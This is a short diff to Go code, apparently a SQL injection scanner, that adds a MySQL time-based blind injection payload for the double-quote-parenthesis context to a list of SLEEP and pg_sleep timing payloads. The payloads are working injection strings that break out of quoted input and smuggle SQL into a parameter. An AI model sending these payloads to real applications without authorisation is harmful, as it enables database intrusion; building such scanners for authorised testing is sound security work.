@@ -63,6 +63,9 @@ func timingPayloads() []timingPayload {
 		{"mysql", func(v string, n int) string { return v + "' AND SLEEP(" + s(n) + ")-- -" }},
 		{"mysql", func(v string, n int) string { return v + "\" AND SLEEP(" + s(n) + ")-- -" }},
 		{"mysql", func(v string, n int) string { return v + "') AND SLEEP(" + s(n) + ")-- -" }},
+		// Double-quote-paren string context — the "-analogue of the ') form above,
+		// so a MySQL param injectable only there still gets a time-based proof.
+		{"mysql", func(v string, n int) string { return v + "\") AND SLEEP(" + s(n) + ")-- -" }},
 		// PostgreSQL.
 		{"postgresql", func(v string, n int) string { return v + " AND 1=(SELECT 1 FROM pg_sleep(" + s(n) + "))" }},
 		{"postgresql", func(v string, n int) string { return v + "' AND 1=(SELECT 1 FROM pg_sleep(" + s(n) + "))-- -" }},
